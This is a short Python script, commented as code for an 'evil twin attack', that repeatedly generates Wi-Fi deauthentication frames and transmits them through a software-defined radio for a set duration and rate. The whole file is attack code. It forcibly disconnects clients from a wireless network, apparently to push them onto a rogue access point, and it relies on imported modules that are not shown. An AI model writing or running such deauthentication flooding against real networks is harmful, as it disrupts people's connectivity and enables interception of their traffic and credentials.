# code to run the evil twin attack
import attack.frames.deauth as frames
from SDRtransmitTCP import transmitData
import time

def transmit_frame_deauth(params):
    duration = int(params[0])
    rate = float(params[1])
    start_time = time.time()
    while(time.time() - start_time < duration):
        time.sleep(1/rate)
        raw_frame = frames.start_deauthentication_frame_generator()
        transmitData(raw_frame)


